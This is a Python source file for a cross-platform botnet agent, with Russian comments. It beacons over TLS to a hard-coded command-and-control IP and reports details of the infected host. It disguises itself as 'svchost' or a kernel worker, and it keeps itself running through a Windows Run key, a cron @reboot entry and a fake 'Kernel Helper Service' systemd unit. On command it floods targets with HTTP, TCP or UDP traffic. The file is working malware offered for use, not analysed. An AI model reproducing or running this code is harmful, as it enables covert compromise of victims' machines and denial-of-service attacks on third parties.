#!/usr/bin/env python3
# AVZ-Aristo RAGE Agent v25.2 – кросс-платформенный (Linux/Windows), скрытный, TLS

import os, sys, platform, subprocess, socket, ssl, time, json, base64, uuid, random, threading, re, shutil, ctypes, string
from pathlib import Path

# ========== КОНФИГУРАЦИЯ ==========
C2_HOST = "80.249.146.202"
C2_PORT = 443          # TLS
C2_FALLBACK_PORT = 80  # TCP plain (если TLS не поднят)
USE_TLS = True
AGENT_VERSION = "25.2-RAGE"
HEARTBEAT_INTERVAL = 30  # секунд
MAX_SILENCE = 120
# ===================================

AGENT_ID = str(uuid.uuid4())
OS_NAME = platform.system()  # Windows или Linux
HOSTNAME = socket.gethostname()
USER = os.environ.get("USER") or os.environ.get("USERNAME") or "unknown"

def get_processor():
    try:
        if OS_NAME == "Windows":
            return platform.processor()
        else:
            with open("/proc/cpuinfo") as f:
                for line in f:
                    if "model name" in line:
                        return line.split(":")[1].strip()
    except:
        pass
    return "Unknown CPU"

def get_ram_total():
    try:
        if OS_NAME == "Windows":
            import psutil
            return round(psutil.virtual_memory().total / (1024**3), 1)
        else:
            with open("/proc/meminfo") as f:
                for line in f:
                    if "MemTotal" in line:
                        return round(int(line.split()[1]) / 1024**2, 1)
    except:
        pass
    return 0

CPU = get_processor()
RAM_GB = get_ram_total()

BASE_INFO = {
    "id": AGENT_ID,
    "hostname": HOSTNAME,
    "os": OS_NAME,
    "os_version": platform.release(),
    "cpu": CPU,
    "ram_gb": RAM_GB,
    "user": USER,
    "agent_version": AGENT_VERSION
}

# ========== СКРЫТНОСТЬ ==========
if OS_NAME == "Windows":
    try:
        # Попытка скрыть окно консоли
        ctypes.windll.kernel32.SetConsoleTitleW("svchost")
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
else:
    # Смена имени процесса через обёртку argv[0] – сработает при запуске через exec -a
    if len(sys.argv) > 1 and sys.argv[1] == '--hidden':
        try:
            import setproctitle
            setproctitle.setproctitle("[kworker/u:2]")
        except:
            pass

# ========== TLS / TCP СОКЕТ ==========
def create_connection():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    if USE_TLS:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        context.set_ciphers('DEFAULT:@SECLEVEL=0')
        try:
            tls_sock = context.wrap_socket(sock, server_hostname=C2_HOST)
            tls_sock.connect((C2_HOST, C2_PORT))
            return tls_sock
        except Exception:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((C2_HOST, C2_FALLBACK_PORT))
            return sock
    else:
        sock.connect((C2_HOST, C2_FALLBACK_PORT))
        return sock

def send_msg(sock, data):
    try:
        msg = json.dumps(data) + "\n"
        sock.sendall(msg.encode())
    except:
        pass

def recv_line(sock):
    buffer = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buffer += chunk
        while b"\n" in buffer:
            line, buffer = buffer.split(b"\n", 1)
            yield line.decode().strip()
    if buffer:
        yield buffer.decode().strip()

# ========== СБОР ПРОЦЕССОВ / СЕТИ ==========
def get_process_list():
    procs = []
    try:
        if OS_NAME == "Windows":
            import psutil
            for p in psutil.process_iter(['pid', 'name']):
                procs.append(f"{p.info['name']} ({p.info['pid']})")
        else:
            output = subprocess.check_output("ps -eo pid,comm --no-headers", shell=True).decode()
            procs = [line.strip() for line in output.splitlines()[-30:]]
    except:
        pass
    return procs[:20]

def get_network():
    conns = []
    try:
        if OS_NAME == "Windows":
            import psutil
            for c in psutil.net_connections(kind='inet')[:20]:
                conns.append(f"{c.laddr.ip}:{c.laddr.port} -> {c.raddr.ip}:{c.raddr.port}" if c.raddr else f"{c.laddr.ip}:{c.laddr.port}")
        else:
            output = subprocess.check_output("ss -tn state established | tail -20", shell=True).decode()
            conns = [line.strip() for line in output.splitlines() if line.strip()]
    except:
        pass
    return conns

# ========== PERSISTENCE ==========
def install_persistence():
    if OS_NAME == "Windows":
        try:
            import winreg
            agent_path = sys.executable if sys.executable else os.path.abspath(__file__)
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdateTask", 0, winreg.REG_SZ, f'"{agent_path}" --hidden')
        except Exception:
            pass
    else:
        # Linux: cron + systemd
        agent_path = os.path.abspath(__file__)
        # Cron
        cron_cmd = f"@reboot /usr/bin/python3 {agent_path} --hidden >/dev/null 2>&1"
        try:
            subprocess.call(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True)
        except:
            pass
        # systemd (если root)
        if os.geteuid() == 0:
            service = f"""[Unit]
Description=Kernel Helper Service
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 {agent_path} --hidden
Restart=always
RestartSec=10
[Install]
WantedBy=multi-user.target"""
            try:
                with open("/etc/systemd/system/khelper.service", "w") as f:
                    f.write(service)
                subprocess.call("systemctl daemon-reload && systemctl enable khelper.service", shell=True)
            except:
                pass

# ========== ВЫПОЛНЕНИЕ АТАКИ ==========
def execute_attack(params):
    target = params.get("target")
    method = params.get("method")
    threads = params.get("threads", 100)
    # Упрощённый движок прямо в агенте: запуск асинхронных потоков флуда
    stop_flag = threading.Event()
    def flood():
        while not stop_flag.is_set():
            try:
                if method in ("GET", "CFB", "CFBUAM", "RAPID"):
                    import urllib.request
                    headers = {"User-Agent": random.choice(UA_LIST)}
                    req = urllib.request.Request(target, headers=headers)
                    urllib.request.urlopen(req, timeout=5)
                elif method == "TCP":
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((target, 80))
                    s.send(b"GET / HTTP/1.1\r\nHost: "+target.encode()+b"\r\n\r\n")
                    s.close()
                elif method == "UDP":
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(b"\xff"*1024, (target, 80))
                    s.close()
                elif method == "SYN_FLOOD":
                    # требуется scapy, пропускаем, если нет
                    pass
            except:
                pass
    for _ in range(threads):
        t = threading.Thread(target=flood, daemon=True)
        t.start()
    return stop_flag

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
]

# ========== ГЛАВНЫЙ ЦИКЛ ==========
def main():
    install_persistence()
    while True:
        try:
            sock = create_connection()
            # Отправка приветствия
            send_msg(sock, {"type": "register", "data": BASE_INFO})
            last_recv = time.time()
            active_attack = None
            stop_flag = None

            for msg_str in recv_line(sock):
                if not msg_str:
                    break
                last_recv = time.time()
                try:
                    cmd = json.loads(msg_str)
                except:
                    continue
                if cmd.get("type") == "attack":
                    if active_attack:
                        stop_flag.set()
                    stop_flag = execute_attack(cmd.get("params", {}))
                    active_attack = cmd
                elif cmd.get("type") == "stop":
                    if stop_flag:
                        stop_flag.set()
                        stop_flag = None
                        active_attack = None
                elif cmd.get("type") == "info":
                    info = BASE_INFO.copy()
                    info["procs"] = get_process_list()
                    info["network"] = get_network()
                    send_msg(sock, {"type": "info_resp", "data": info})
                elif cmd.get("type") == "ping":
                    send_msg(sock, {"type": "pong"})
            sock.close()
        except Exception as e:
            pass
        time.sleep(10)

if __name__ == "__main__":
    # Скрытый перезапуск с флагом --hidden (Linux)
    if '--hidden' not in sys.argv and OS_NAME != "Windows":
        args = [sys.executable] + sys.argv + ['--hidden']
        try:
            subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
            sys.exit(0)
        except:
            pass
    main()